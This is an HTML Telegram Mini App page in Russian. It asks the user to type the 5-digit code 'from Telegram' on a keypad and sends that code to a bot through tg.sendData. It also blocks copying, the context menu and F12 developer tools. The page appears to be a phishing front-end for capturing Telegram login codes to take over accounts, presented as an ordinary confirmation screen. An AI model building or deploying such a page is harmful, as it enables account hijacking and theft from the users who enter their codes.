<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ввод кода подтверждения</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .header h1 {
            font-size: 24px;
            margin: 0;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(138, 43, 226, 0.5);
        }
        
        .header p {
            font-size: 16px;
            margin: 10px 0 0;
            color: #b8b8b8;
        }
        
        .code-display {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 2px solid rgba(138, 43, 226, 0.5);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .code-input {
            font-size: 48px;
            letter-spacing: 15px;
            text-align: center;
            color: #ffffff;
            font-weight: bold;
            text-shadow: 0 0 20px #8a2be2;
            min-height: 70px;
            word-break: break-all;
        }
        
        .code-placeholder {
            font-size: 48px;
            letter-spacing: 15px;
            text-align: center;
            color: rgba(255, 255, 255, 0.3);
        }
        
        .keypad {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .key {
            aspect-ratio: 1;
            border: none;
            border-radius: 20px;
            font-size: 32px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .key.number {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(5px);
            color: white;
            border: 2px solid rgba(138, 43, 226, 0.3);
        }
        
        .key.number:hover {
            background: rgba(138, 43, 226, 0.3);
            transform: scale(1.05);
            border-color: #8a2be2;
        }
        
        .key.number:active {
            transform: scale(0.95);
        }
        
        .key.delete {
            background: rgba(255, 69, 69, 0.2);
            backdrop-filter: blur(5px);
            color: #ff6b6b;
            border: 2px solid rgba(255, 69, 69, 0.5);
            font-size: 28px;
        }
        
        .key.delete:hover {
            background: rgba(255, 69, 69, 0.4);
            transform: scale(1.05);
        }
        
        .key.delete:active {
            transform: scale(0.95);
        }
        
        .key.confirm {
            background: linear-gradient(135deg, #8a2be2, #4a0080);
            color: white;
            border: none;
            font-size: 28px;
            box-shadow: 0 5px 20px rgba(138, 43, 226, 0.5);
            grid-column: span 4;
            aspect-ratio: auto;
            padding: 15px;
        }
        
        .key.confirm:hover {
            background: linear-gradient(135deg, #9b4deb, #5a00a0);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(138, 43, 226, 0.7);
        }
        
        .key.confirm:active {
            transform: translateY(0);
        }
        
        .key:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #b8b8b8;
            font-size: 14px;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        
        .loading.active {
            display: block;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(138, 43, 226, 0.3);
            border-top-color: #8a2be2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #ff6b6b;
            text-align: center;
            margin-top: 20px;
            font-size: 16px;
            display: none;
        }
        
        .error-message.active {
            display: block;
        }
        
        .info-message {
            color: #8a2be2;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Подтверждение</h1>
            <p>Введите код из Telegram</p>
        </div>
        
        <div id="errorMessage" class="error-message"></div>
        
        <div class="code-display">
            <div id="codeDisplay" class="code-input"></div>
            <div id="codePlaceholder" class="code-placeholder">_____</div>
        </div>
        
        <div class="info-message">
            Код состоит из 5 цифр
        </div>
        
        <div class="keypad">
            <button class="key number" onclick="addDigit('1')">1</button>
            <button class="key number" onclick="addDigit('2')">2</button>
            <button class="key number" onclick="addDigit('3')">3</button>
            <button class="key number" onclick="addDigit('4')">4</button>
            
            <button class="key number" onclick="addDigit('5')">5</button>
            <button class="key number" onclick="addDigit('6')">6</button>
            <button class="key number" onclick="addDigit('7')">7</button>
            <button class="key number" onclick="addDigit('8')">8</button>
            
            <button class="key number" onclick="addDigit('9')">9</button>
            <button class="key number" onclick="addDigit('0')">0</button>
            <button class="key delete" onclick="deleteDigit()">⌫</button>
            <button class="key delete" onclick="clearAll()">❌</button>
        </div>
        
        <button class="key confirm" onclick="submitCode()">✅ Подтвердить код</button>
        
        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p>Проверка кода...</p>
        </div>
        
        <div class="footer">
            Введите 5-значный код из Telegram
        </div>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        // Проверка, открыто ли в Telegram
        let tg = window.Telegram?.WebApp;
        
        if (!tg) {
            document.body.innerHTML = `
                <div style="text-align: center; padding: 50px 20px;">
                    <h1 style="color: #ff6b6b;">❌ Доступ запрещен</h1>
                    <p style="color: white; margin-top: 20px;">Это приложение работает только внутри Telegram бота.</p>
                    <p style="color: #b8b8b8; margin-top: 20px;">Пожалуйста, откройте через бота: @your_bot_username</p>
                </div>
            `;
            throw new Error("Not in Telegram");
        }
        
        let code = '';
        const MAX_CODE_LENGTH = 5;
        
        tg.setHeaderColor('#1a1a2e');
        tg.setBackgroundColor('#0f3460');
        tg.expand();
        tg.ready();
        
        // Защита от копирования/контекстного меню
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('selectstart', e => e.preventDefault());
        document.addEventListener('touchstart', e => {
            if (e.touches.length > 1) e.preventDefault();
        }, { passive: false });
        document.addEventListener('keydown', e => {
            if (e.ctrlKey && ['c', 'v', 's', 'u'].includes(e.key.toLowerCase())) e.preventDefault();
            if (e.key === 'F12') e.preventDefault();
        });
        
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.classList.add('active');
            setTimeout(() => errorDiv.classList.remove('active'), 3000);
        }
        
        function updateDisplay() {
            const display = document.getElementById('codeDisplay');
            const placeholder = document.getElementById('codePlaceholder');
            
            if (code.length > 0) {
                display.textContent = code;
                display.style.display = 'block';
                placeholder.style.display = 'none';
            } else {
                display.style.display = 'none';
                placeholder.style.display = 'block';
            }
        }
        
        function addDigit(digit) {
            if (code.length < MAX_CODE_LENGTH) {
                code += digit;
                updateDisplay();
                tg.HapticFeedback.impactOccurred('light');
                
                if (code.length === MAX_CODE_LENGTH) {
                    setTimeout(submitCode, 300);
                }
            } else {
                showError(`Максимум ${MAX_CODE_LENGTH} цифр`);
            }
        }
        
        function deleteDigit() {
            code = code.slice(0, -1);
            updateDisplay();
            tg.HapticFeedback.impactOccurred('light');
        }
        
        function clearAll() {
            code = '';
            updateDisplay();
            tg.HapticFeedback.impactOccurred('light');
        }
        
        function showLoading() {
            document.getElementById('loading').classList.add('active');
        }
        
        function hideLoading() {
            document.getElementById('loading').classList.remove('active');
        }
        
        function submitCode() {
            if (code.length !== MAX_CODE_LENGTH) {
                showError(`Введите полный код (${MAX_CODE_LENGTH} цифр)`);
                tg.HapticFeedback.notificationOccurred('error');
                return;
            }
            
            showLoading();
            tg.HapticFeedback.notificationOccurred('success');
            
            tg.sendData(JSON.stringify({
                action: 'code_input',
                code: code
            }));
            
            setTimeout(hideLoading, 2000);
        }
        
        tg.onEvent('viewportChanged', () => tg.expand());
        
        updateDisplay();
    </script>
</body>
</html>
